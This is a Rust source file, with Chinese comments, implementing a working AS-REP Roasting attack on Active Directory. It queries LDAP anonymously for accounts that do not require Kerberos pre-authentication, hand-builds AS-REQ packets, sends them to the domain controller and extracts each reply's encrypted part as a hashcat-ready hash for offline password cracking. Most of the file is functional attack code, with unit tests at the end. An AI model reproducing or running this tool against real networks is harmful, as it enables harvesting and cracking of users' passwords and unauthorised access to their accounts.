//! AS-REP Roasting 攻击模块
//!
//! KDC在AS-REQ阶段无需预认证即可返回TGT，TGT使用用户密码哈希加密，
//! 攻击者可离线破解获取用户密码。
//!
//! 攻击步骤：
//! 1. LDAP查询设置了 DONT_REQ_PREAUTH (UF_DONT_REQUIRE_PREAUTH=0x400000) 的用户
//! 2. 对每个目标用户发送AS-REQ请求（不携带预认证数据）
//! 3. 从AS-REP响应中提取加密的enc-part
//! 4. 输出hashcat可破解格式 ($krb5asrep$etype$*user$domain$hash*)

use serde::{Deserialize, Serialize};

/// AS-REP Roasting 票据
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AsrepTicket {
    /// 用户名
    pub username: String,
    /// 域名
    pub domain: String,
    /// 加密类型 (RC4-HMAC=23, AES256-CTS=18, AES128-CTS=17)
    pub etype: i32,
    /// 加密的AS-REP enc-part
    pub encrypted_part: Vec<u8>,
    /// 用户是否启用
    pub enabled: bool,
    /// hashcat格式输出 ($krb5asrep$23$*user$domain$hash*)
    pub hashcat_hash: String,
    /// 用户描述
    pub description: Option<String>,
}

/// 执行 AS-REP Roasting 攻击
pub async fn asrep_roast(dc: &str, domain: &str) -> Result<Vec<AsrepTicket>, String> {
    // 第一步：LDAP查询无预认证用户
    let targets = query_asrep_users(dc, domain).await?;

    if targets.is_empty() {
        tracing::info!("[AS-REP Roasting] 未发现设置了DONT_REQ_PREAUTH的用户");
        return Ok(Vec::new());
    }

    tracing::info!("[AS-REP Roasting] 发现 {} 个潜在目标", targets.len());

    // 第二步：对每个用户请求AS-REP
    let mut tickets = Vec::new();
    for target in &targets {
        match send_as_req(dc, domain, target).await {
            Ok(Some(ticket)) => {
                tracing::info!("[AS-REP Roasting] ✓ 获取 {} 的加密票据", target.username);
                tickets.push(ticket);
            }
            Ok(None) => {
                tracing::info!("[AS-REP Roasting] - {} 需要预认证，跳过", target.username);
            }
            Err(e) => {
                tracing::warn!("[AS-REP Roasting] ✗ {} 请求失败: {}", target.username, e);
            }
        }
    }

    Ok(tickets)
}

/// AS-REP目标用户
#[derive(Debug, Clone)]
struct AsrepTarget {
    username: String,
    enabled: bool,
    description: Option<String>,
}

/// LDAP查询DONT_REQ_PREAUTH用户
async fn query_asrep_users(dc: &str, domain: &str) -> Result<Vec<AsrepTarget>, String> {
    let ldap_url = format!("ldap://{}:389", dc);
    let mut ldap = ldap3::LdapConn::new(&ldap_url)
        .map_err(|e| format!("LDAP连接失败: {}", e))?;

    // 匿名绑定
    ldap.simple_bind("", "")
        .map_err(|e| format!("LDAP绑定失败: {}", e))?;

    let base_dn = domain_to_dn(domain);
    // UF_DONT_REQUIRE_PREAUTH = 0x400000 = 4194304
    let filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
    let attrs = &["sAMAccountName", "userAccountControl", "description"];

    let sr = ldap
        .search(&base_dn, ldap3::Scope::Subtree, filter, attrs)
        .map_err(|e| format!("LDAP查询失败: {}", e))?;

    let mut targets = Vec::new();
    for entry in &sr.0 {
        let entry = ldap3::SearchEntry::construct(entry.clone());
        let username = entry.attrs.get("sAMAccountName")
            .and_then(|v| v.first().cloned())
            .unwrap_or_default();
        let uac: u32 = entry.attrs.get("userAccountControl")
            .and_then(|v| v.first())
            .and_then(|v| v.parse().ok())
            .unwrap_or(0);
        let enabled = uac & 2 == 0; // ACCOUNTDISABLE
        let description = entry.attrs.get("description")
            .and_then(|v| v.first().cloned());

        if !username.is_empty() {
            targets.push(AsrepTarget {
                username,
                enabled,
                description,
            });
        }
    }

    Ok(targets)
}

/// 发送AS-REQ请求（无预认证）
async fn send_as_req(
    dc: &str,
    domain: &str,
    target: &AsrepTarget,
) -> Result<Option<AsrepTicket>, String> {
    let addr = format!("{}:88", dc);

    // 构造AS-REQ（不携带PA-ENC-TIMESTAMP预认证数据）
    let as_req = build_as_req_no_preauth(domain, &target.username);

    let mut stream = tokio::net::TcpStream::connect(&addr)
        .await
        .map_err(|e| format!("连接KDC失败: {}", e))?;

    // RFC 4120 Section 7.2.2: Kerberos over TCP 需要4字节大端长度前缀
    let len_prefix = (as_req.len() as u32).to_be_bytes();
    tokio::io::AsyncWriteExt::write_all(&mut stream, &len_prefix)
        .await
        .map_err(|e| format!("发送AS-REQ长度前缀失败: {}", e))?;
    tokio::io::AsyncWriteExt::write_all(&mut stream, &as_req)
        .await
        .map_err(|e| format!("发送AS-REQ失败: {}", e))?;

    // 读取响应: 先读4字节长度前缀，再读消息体
    let mut len_buf = [0u8; 4];
    tokio::io::AsyncReadExt::read_exact(&mut stream, &mut len_buf)
        .await
        .map_err(|e| format!("读取KDC响应长度前缀失败: {}", e))?;
    let resp_len = u32::from_be_bytes(len_buf) as usize;

    if resp_len == 0 || resp_len > 65536 {
        return Err(format!("KDC响应长度异常: {} 字节", resp_len));
    }

    let mut buf = vec![0u8; resp_len];
    tokio::io::AsyncReadExt::read_exact(&mut stream, &mut buf)
        .await
        .map_err(|e| format!("读取AS-REP失败: {}", e))?;

    // 检查是否为KRB-ERROR响应 (APPLICATION 30 = 0x7E)
    if is_krb_error(&buf) {
        // KDC_ERR_PREAUTH_REQUIRED (25) -> 用户实际上需要预认证
        let error_code = parse_krb_error_code(&buf);
        if error_code == 25 {
            // 需要预认证，该用户不适合AS-REP Roasting
            return Ok(None);
        }
        return Err(format!("KDC返回错误 (error_code={})", error_code));
    }

    // 解析AS-REP
    let (etype, encrypted_part, hashcat_hash) =
        parse_as_rep(&buf, domain, &target.username)?;

    Ok(Some(AsrepTicket {
        username: target.username.clone(),
        domain: domain.to_string(),
        etype,
        encrypted_part,
        enabled: target.enabled,
        hashcat_hash,
        description: target.description.clone(),
    }))
}

/// 构造无预认证的AS-REQ
///
/// KDCOptions不请求预认证，且不携带PA-ENC-TIMESTAMP padata。
/// 如果目标用户设置了DONT_REQ_PREAUTH，KDC将直接返回AS-REP。
fn build_as_req_no_preauth(domain: &str, username: &str) -> Vec<u8> {
    let domain_bytes = domain.as_bytes();
    let user_bytes = username.as_bytes();

    // 构造KDC-REQ-BODY
    let mut req_body = Vec::new();

    // kdc-options [0] BIT STRING
    // FORWARDABLE | RENEWABLE | CANONICALIZE = 0x50800000
    // 不设置PRE_AUTH相关标志
    req_body.extend_from_slice(&[
        0xA0, 0x08, 0x03, 0x06, 0x00, 0x50, 0x80, 0x00, 0x00, 0x00,
    ]);

    // cname [1] PrincipalName
    let mut cname = Vec::new();
    cname.push(0xA0); // name-type [0]
    cname.push(0x03);
    cname.push(0x02);
    cname.push(0x01);
    cname.push(0x01); // NT-PRINCIPAL (1)

    cname.push(0xA1); // name-string [1]
    let u_len = user_bytes.len() as u8;
    cname.push(u_len + 4);
    cname.push(0x30); // SEQUENCE
    cname.push(u_len + 2);
    cname.push(0x1B); // GeneralString
    cname.push(u_len);
    cname.extend_from_slice(user_bytes);

    let cname_len = cname.len() as u8;
    req_body.push(0xA1);
    req_body.push(cname_len + 2);
    req_body.push(0x30);
    req_body.push(cname_len);
    req_body.extend_from_slice(&cname);

    // realm [2] GeneralString
    let r_len = domain_bytes.len() as u8;
    req_body.push(0xA2);
    req_body.push(r_len + 2);
    req_body.push(0x1B);
    req_body.push(r_len);
    req_body.extend_from_slice(domain_bytes);

    // sname [3] PrincipalName (krbtgt/REALM)
    let krbtgt_spn = b"krbtgt";
    let krbtgt_domain = domain_bytes;

    let mut sname = Vec::new();
    sname.push(0xA0); // name-type [0] NT-SRV-INST (2)
    sname.extend_from_slice(&[0x03, 0x02, 0x01, 0x02]);

    sname.push(0xA1); // name-string [1]
    let ns_inner_len = krbtgt_spn.len() + 2 + krbtgt_domain.len() + 2;
    let ns_seq_len = ns_inner_len + 2; // +2 for SEQUENCE tag+len
    sname.push(ns_seq_len as u8);
    sname.push(0x30); // SEQUENCE
    sname.push(ns_inner_len as u8);

    // "krbtgt"
    sname.push(0x1B);
    sname.push(krbtgt_spn.len() as u8);
    sname.extend_from_slice(krbtgt_spn);

    // domain
    sname.push(0x1B);
    sname.push(krbtgt_domain.len() as u8);
    sname.extend_from_slice(krbtgt_domain);

    let sname_len = sname.len() as u8;
    req_body.push(0xA3);
    req_body.push(sname_len + 2);
    req_body.push(0x30);
    req_body.push(sname_len);
    req_body.extend_from_slice(&sname);

    // till [4] GeneralizedTime (20370913024805Z)
    req_body.extend_from_slice(&[
        0xA4, 0x11, 0x18, 0x0F, 0x32, 0x30, 0x33, 0x37,
        0x30, 0x39, 0x31, 0x33, 0x30, 0x32, 0x34, 0x38,
        0x30, 0x35, 0x5A,
    ]);

    // nonce [5] INTEGER (随机数)
    req_body.extend_from_slice(&[0xA5, 0x03, 0x02, 0x01, 0x7F]);

    // etype [8] SEQUENCE OF INTEGER
    // RC4-HMAC(23), AES256-CTS(18), AES128-CTS(17)
    req_body.extend_from_slice(&[
        0xA8, 0x0C,
        0x30, 0x0A,
        0x02, 0x01, 0x17, // 23
        0x02, 0x01, 0x12, // 18
        0x02, 0x01, 0x11, // 17
    ]);

    // 构造KDC-REQ主体
    let mut body = Vec::new();

    // pvno [0] INTEGER 5
    body.extend_from_slice(&[0xA0, 0x03, 0x02, 0x01, 0x05]);

    // msg-type [1] INTEGER 10 (AS-REQ)
    body.extend_from_slice(&[0xA1, 0x03, 0x02, 0x01, 0x0A]);

    // padata [2] — 不发送（无预认证数据）

    // req-body [4]
    let rb_len = req_body.len();
    body.push(0xA4);
    push_asn1_length(&mut body, rb_len);
    body.extend_from_slice(&req_body);

    // 封装为 [APPLICATION 10] (AS-REQ = 0x6A)
    let body_len = body.len();
    let mut req = Vec::new();
    req.push(0x6A); // APPLICATION 10 (AS-REQ)
    push_asn1_length(&mut req, body_len);
    req.extend_from_slice(&body);

    req
}

/// 检查是否为KRB-ERROR响应 ([APPLICATION 30] = 0x7E)
fn is_krb_error(data: &[u8]) -> bool {
    data.first().copied() == Some(0x7E)
}

/// 从KRB-ERROR中解析error-code
fn parse_krb_error_code(data: &[u8]) -> i32 {
    // 查找 error-code [6] 标签 (0xA6)
    if let Some(pos) = data.windows(2).position(|w| w[0] == 0xA6) {
        let after = &data[pos + 2..];
        // 找到INTEGER (0x02)
        if let Some(int_pos) = after.windows(2).position(|w| w[0] == 0x02) {
            let len = after[int_pos + 1] as usize;
            let start = int_pos + 2;
            if start + len <= after.len() {
                let mut val = 0i32;
                for &b in &after[start..start + len] {
                    val = (val << 8) | b as i32;
                }
                return val;
            }
        }
    }
    -1
}

/// 解析AS-REP响应，提取加密的enc-part
fn parse_as_rep(data: &[u8], domain: &str, username: &str) -> Result<(i32, Vec<u8>, String), String> {
    if data.is_empty() {
        return Err("AS-REP响应为空".to_string());
    }

    // 验证APPLICATION标签: AS-REP = [APPLICATION 11] = 0x6B
    if data.first().copied() != Some(0x6B) {
        return Err(format!(
            "非AS-REP响应 (首字节=0x{:02X}，期望0x6B)",
            data.first().copied().unwrap_or(0)
        ));
    }

    let mut etype: i32 = 23;
    let mut encrypted_part = Vec::new();

    // KDC-REP结构中 enc-part 是 [6] (0xA6)，不是 [3]
    // KDC-REP ::= SEQUENCE { pvno[0], msg-type[1], padata[2], crealm[3], cname[4], ticket[5], enc-part[6] }
    // AS-REP Roasting需要提取enc-part[6]（使用用户密码哈希加密）
    if let Some(pos) = data.windows(2).position(|w| w[0] == 0xA6) {
        let inner = &data[pos + 2..];

        // 查找etype [0] INTEGER (0xA0 ... 0x02)
        if let Some(epos) = inner.windows(3).position(|w| w[0] == 0xA0 && w[2] == 0x02) {
            if epos + 3 < inner.len() {
                let len_byte = inner[epos + 3] as usize;
                if epos + 4 + len_byte <= inner.len() {
                    let etype_slice = &inner[epos + 4..epos + 4 + len_byte];
                    etype = etype_slice.iter().fold(0i32, |acc, &b| (acc << 8) | b as i32);
                }
            }
        }

        // 查找cipher [2] OCTET STRING (0xA2 后跟 0x04)
        if let Some(cpos) = inner.windows(2).position(|w| w[0] == 0xA2) {
            let after_tag = &inner[cpos + 2..];
            if let Some(os_pos) = after_tag.windows(2).position(|w| w[0] == 0x04) {
                let os_len = after_tag[os_pos + 1] as usize;
                let cipher_start = os_pos + 2;
                if cipher_start + os_len <= after_tag.len() {
                    encrypted_part = after_tag[cipher_start..cipher_start + os_len].to_vec();
                }
            }
        }

        // 回退：查找任何OCTET STRING
        if encrypted_part.is_empty() {
            if let Some(os_pos) = inner.windows(2).position(|w| w[0] == 0x04) {
                let os_len = inner[os_pos + 1] as usize;
                let start = os_pos + 2;
                if start + os_len <= inner.len() {
                    encrypted_part = inner[start..start + os_len].to_vec();
                }
            }
        }
    }

    if encrypted_part.is_empty() {
        return Err("无法从AS-REP中提取加密部分（enc-part/cipher解析失败）".to_string());
    }

    // 构造hashcat格式: $krb5asrep$etype$*username$domain$hash*
    let hashcat = format!(
        "$krb5asrep${}$*{}${}${}*",
        etype,
        username,
        domain,
        hex::encode(&encrypted_part)
    );

    Ok((etype, encrypted_part, hashcat))
}

/// ASN.1 DER长度编码辅助函数
fn push_asn1_length(buf: &mut Vec<u8>, len: usize) {
    if len < 0x80 {
        buf.push(len as u8);
    } else if len < 0x100 {
        buf.push(0x81);
        buf.push(len as u8);
    } else {
        buf.push(0x82);
        buf.push((len >> 8) as u8);
        buf.push((len & 0xFF) as u8);
    }
}

/// 域名转DN
fn domain_to_dn(domain: &str) -> String {
    domain.split('.').map(|p| format!("DC={}", p)).collect::<Vec<_>>().join(",")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_domain_to_dn() {
        assert_eq!(domain_to_dn("test.local"), "DC=test,DC=local");
    }

    #[test]
    fn test_is_krb_error() {
        let err_data = vec![0x7E, 0x00, 0x00];
        assert!(is_krb_error(&err_data));

        let ok_data = vec![0x6B, 0x00, 0x00]; // APPLICATION 11 (AS-REP)
        assert!(!is_krb_error(&ok_data));
    }

    #[test]
    fn test_parse_krb_error_code() {
        // error-code = 25 (KDC_ERR_PREAUTH_REQUIRED)
        let data = vec![
            0x7E, 0x10,
            0xA6, 0x03, 0x02, 0x01, 0x19,
        ];
        assert_eq!(parse_krb_error_code(&data), 25);
    }

    #[test]
    fn test_build_as_req_basic() {
        let req = build_as_req_no_preauth("CORP.LOCAL", "testuser");
        assert!(!req.is_empty());
        assert_eq!(req[0], 0x6A); // APPLICATION 10 (AS-REQ)
    }

    #[test]
    fn test_build_as_req_no_preauth_flag() {
        // 验证不包含PA-ENC-TIMESTAMP (padata类型1)
        let req = build_as_req_no_preauth("CORP.LOCAL", "testuser");
        // msg-type应为10 (AS-REQ)
        // 检查包含 0xA1, 0x03, 0x02, 0x01, 0x0A (msg-type [1] = 10)
        let msg_type_pattern = [0xA1, 0x03, 0x02, 0x01, 0x0A];
        assert!(req.windows(5).any(|w| w == msg_type_pattern));
    }

    #[test]
    fn test_parse_as_rep_basic() {
        let data = vec![
            0x6B, 0x82, 0x00, 0x20, // APPLICATION 11 (AS-REP)
            0xA6, 0x1A, // [6] enc-part (KDC-REP的enc-part是[6])
            0x30, 0x18, // SEQUENCE
            0xA0, 0x03, 0x02, 0x01, 0x12, // etype [0] = 18 (AES256)
            0xA2, 0x11, 0x04, 0x0F, // cipher [2] OCTET STRING (15 bytes)
            0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
            0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E,
        ];
        let (etype, cipher, hashcat) = parse_as_rep(&data, "CORP", "testuser").unwrap();
        assert_eq!(etype, 18);
        assert_eq!(cipher.len(), 15);
        // 验证hashcat格式: $krb5asrep$18$*testuser$CORP$hash*
        assert!(hashcat.starts_with("$krb5asrep$18$*testuser$CORP$"));
        assert!(hashcat.ends_with('*'));
    }

    #[test]
    fn test_parse_as_rep_wrong_tag() {
        // 非AS-REP标签应返回错误
        let data = vec![0x6C, 0x00, 0x00]; // TGS-REQ tag
        let result = parse_as_rep(&data, "CORP", "user");
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_as_rep_empty() {
        let result = parse_as_rep(&[], "CORP", "user");
        assert!(result.is_err());
    }

    #[test]
    fn test_hashcat_format() {
        // 验证hashcat格式: $krb5asrep$23$*username$domain$hash*
        let encrypted = vec![0xAB, 0xCD, 0xEF];
        let hashcat = format!(
            "$krb5asrep${}$*{}${}${}*",
            23,
            "no_preauth_user",
            "corp.local",
            hex::encode(&encrypted)
        );
        assert_eq!(hashcat, "$krb5asrep$23$*no_preauth_user$corp.local$abcdef*");
    }

    #[test]
    fn test_asrep_ticket_creation() {
        let ticket = AsrepTicket {
            username: "no_preauth_user".to_string(),
            domain: "corp.local".to_string(),
            etype: 23,
            encrypted_part: vec![0xAB, 0xCD, 0xEF],
            enabled: true,
            hashcat_hash: "$krb5asrep$23$*no_preauth_user$corp.local$abcdef*".to_string(),
            description: Some("危险配置".to_string()),
        };
        assert_eq!(ticket.username, "no_preauth_user");
        assert!(ticket.enabled);
        assert!(ticket.hashcat_hash.contains("$krb5asrep$23$"));
        assert!(ticket.hashcat_hash.ends_with('*'));
    }

    #[test]
    fn test_push_asn1_length() {
        let mut buf = Vec::new();
        push_asn1_length(&mut buf, 50);
        assert_eq!(buf, vec![50]);

        buf.clear();
        push_asn1_length(&mut buf, 200);
        assert_eq!(buf, vec![0x81, 200]);

        buf.clear();
        push_asn1_length(&mut buf, 300);
        assert_eq!(buf, vec![0x82, 0x01, 0x2C]);
    }
}
